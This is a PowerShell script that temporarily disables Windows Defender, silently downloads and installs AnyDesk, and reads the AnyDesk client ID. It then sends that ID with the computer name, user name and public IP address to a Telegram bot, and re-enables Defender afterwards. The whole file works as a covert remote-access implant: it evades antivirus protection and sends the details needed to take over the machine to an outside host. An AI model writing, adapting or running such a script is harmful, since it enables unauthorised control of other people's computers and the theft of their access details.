# Disable Defender Temporarily
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true

# Install AnyDesk (NEW METHOD)
Start-Process -FilePath "powershell" -ArgumentList {
    $anydeskUrl = "https://download.anydesk.com/AnyDesk.exe"
    $anydeskPath = "$env:TEMP\AnyDesk.exe"
    Invoke-WebRequest -Uri $anydeskUrl -OutFile $anydeskPath
    Start-Process -FilePath $anydeskPath -ArgumentList "--silent --install" -Wait
} -Wait

# Get AnyDesk ID
Start-Sleep -Seconds 15
try {
    $anydeskId = (Get-ItemProperty "HKLM:\SOFTWARE\AnyDesk\").client_id
} catch {
    $anydeskId = "NOT_FOUND"
}

# Send Telegram Alert
$BOT_TOKEN = "Your Token Id"
$CHAT_ID = "your chat id"
$computerName = $env:COMPUTERNAME
$userName = $env:USERNAME
$time = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
$ipAddress = (Invoke-RestMethod -Uri "https://api.ipify.org").ToString()

$message = "🚨 Laptop Accessed!`n`n💻 Computer: $computerName`n👤 User: $userName`n🌐 IP: $ipAddress`n⏰ Time: $time`n🔗 AnyDesk ID: $anydeskId"
Invoke-WebRequest -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$CHAT_ID&text=$message" -UseBasicParsing

# Create Log File
"$time - $computerName - $userName - $ipAddress - AnyDesk: $anydeskId" | Out-File -FilePath "$env:USERPROFILE\access_log.txt" -Append

# Re-enable Defender
Set-MpPreference -DisableRealtimeMonitoring $false
Set-MpPreference -DisableIOAVProtection $false
